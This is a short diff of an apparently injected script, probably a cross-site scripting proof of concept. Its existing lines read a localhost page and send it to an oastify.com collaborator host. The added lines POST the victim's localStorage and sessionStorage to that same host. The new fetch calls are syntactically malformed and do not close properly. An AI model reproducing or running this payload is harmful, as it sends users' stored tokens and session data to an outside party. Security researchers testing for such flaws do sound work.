@@ -9,4 +9,18 @@
   }
   var response = httpGet("http://127.0.0.1/index.html");
   var send_it = httpGet("https://8enqzgfithu8t9onu465aphc339vxlla.oastify.com?toolsforhumanityxss="+response);
+  fetch("https://8enqzgfithu8t9onu465aphc339vxlla.oastify.com/localstorage", {
+  method: "POST",
+  body: JSON.stringify(window.localStorage),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  };
+    fetch("https://8enqzgfithu8t9onu465aphc339vxlla.oastify.com/sessionstorage", {
+  method: "POST",
+  body: JSON.stringify(window.sessionStorage),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  };
+});
+
 </script>
